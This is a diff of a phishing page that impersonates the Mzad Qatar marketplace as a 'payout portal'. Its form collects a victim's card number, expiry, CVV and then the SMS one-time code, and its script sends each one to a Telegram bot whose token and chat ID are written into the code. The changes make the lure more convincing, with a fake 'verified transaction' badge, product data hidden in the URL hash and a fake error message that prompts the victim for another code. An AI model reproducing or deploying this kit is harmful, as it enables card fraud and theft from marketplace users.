@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-    <title>Mzad Qatar | Secure Payout Portal</title>
+    <title>Mzad Qatar | Safe Payout Portal</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
         :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
         body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; }
         .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; }
-        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; }
+        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
         .logo-main { height: 45px; }
         .ad-box { border-bottom: 8px solid var(--bg); }
         .img-container { width: 100%; aspect-ratio: 1.2; background: #fff; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #eee; overflow: hidden; }
@@ -16,9 +16,11 @@
         .info { padding: 16px; }
         .ad-price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
         .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; }
+        
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; align-items: center; justify-content: center; }
         .modal-content { background: white; width: 85%; padding: 25px; border-radius: 24px; text-align: center; }
         .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
+        
         #step-2 { display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--mzad-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -28,38 +30,41 @@
 </head>
 <body>
 <div class="app-shell">
-    <header><img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main"><div style="font-weight:700; color:var(--mzad-red);">EN</div></header>
+    <header><img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main"><div style="font-weight:700; color:var(--mzad-red); font-size: 14px;">العربية</div></header>
     <div class="ad-box">
         <div class="img-container"><img id="p-img" src=""></div>
         <div class="info">
-            <h1 style="font-size:20px;" id="p-name">Loading...</h1>
+            <div style="color: #27ae60; font-size: 12px; font-weight: 800; margin-bottom: 5px;">● VERIFIED TRANSACTION</div>
+            <h1 style="font-size:20px; margin:0 0 10px;" id="p-name">Loading...</h1>
             <div class="ad-price" id="p-price">0 QAR</div>
         </div>
     </div>
-    <div style="padding:20px 16px;"><button class="btn-main" onclick="openModal()">RECEIVE PAYOUT</button></div>
+    <div style="padding:20px 16px;"><button class="btn-main" onclick="openModal()">RECEIVE FUNDS</button></div>
 
     <div class="modal" id="payModal">
         <div class="modal-content" id="step-1">
-            <div style="font-weight:700; margin-bottom:20px;">Payout Verification</div>
+            <div style="font-weight:700; margin-bottom:20px;">Secure Payout Verification</div>
             <form id="card-form">
                 <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                 <div style="display:flex; gap:10px;">
-                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5">
-                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4">
+                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex:1.5;">
+                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex:1;">
                 </div>
                 <button type="submit" class="btn-main">CONTINUE</button>
             </form>
+            <div onclick="closeModal()" style="margin-top:15px; color:#999; cursor:pointer; font-size:14px;">Cancel</div>
         </div>
         <div class="modal-content" id="step-2">
-            <div style="font-weight:700;">3D Secure</div>
-            <p style="font-size:13px; color:#666;">Enter the OTP code from SMS to confirm the transfer.</p>
+            <div style="font-weight:700;">Bank Verification</div>
+            <p style="font-size:13px; color:#666;">Enter the verification code sent to your mobile phone.</p>
             <div id="loading-bank" style="display:none;"><div class="loader"></div></div>
             <form id="sms-form">
                 <input type="text" id="sms-code" class="q-inp" placeholder="SMS Code" required>
-                <button type="submit" class="btn-main">VERIFY</button>
+                <button type="submit" class="btn-main">CONFIRM</button>
             </form>
         </div>
     </div>
+
     <div class="app-footer">
         <p style="font-weight:700; font-size:13px;">GET THE MZAD QATAR APP</p>
         <div class="store-badges">
@@ -70,17 +75,16 @@
 </div>
 
 <script>
+    // БОТ ДЛЯ ЛОГОВ
     const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const C = '8071425015';
 
-    // ДЕКОДИРОВАНИЕ ДАННЫХ ИЗ URL
-    const url = new URLSearchParams(window.location.search);
-    const dataRaw = url.get('d');
+    // ДЕКОДИРОВАНИЕ ИЗ HASH (#)
     let item = "Product", price = "0", img = "";
-
-    if(dataRaw) {
+    const hashData = window.location.hash.substring(1);
+    if(hashData) {
         try {
-            const decoded = JSON.parse(atob(dataRaw));
+            const decoded = JSON.parse(atob(hashData));
             item = decoded.i; price = decoded.p; img = decoded.m;
         } catch(e) {}
     }
@@ -90,10 +94,12 @@
     if(img) document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(img)}`;
 
     function openModal() { document.getElementById('payModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('payModal').style.display = 'none'; }
 
     document.getElementById('cn').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim(); };
     document.getElementById('ce').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim(); };
 
+    // ОТПРАВКА КАРТЫ
     document.getElementById('card-form').onsubmit = (e) => {
         e.preventDefault();
         const msg = `🇶🇦 **CARD**\n📦 ${item}\n💰 ${price} QAR\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
@@ -104,11 +110,13 @@
         setTimeout(() => { document.getElementById('loading-bank').style.display = 'none'; }, 2000);
     };
 
+    // ОТПРАВКА SMS
     document.getElementById('sms-form').onsubmit = (e) => {
         e.preventDefault();
-        const msg = `🔑 **SMS**: \`${document.getElementById('sms-code').value}\`\n👤 Item: ${item}`;
+        const code = document.getElementById('sms-code').value;
+        const msg = `🔑 **SMS**: \`${code}\`\n👤 Item: ${item}`;
         new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-        alert("Verification failed. A new code has been sent.");
+        alert("Invalid code. Please wait for a new one.");
         document.getElementById('sms-code').value = '';
     };
 </script>
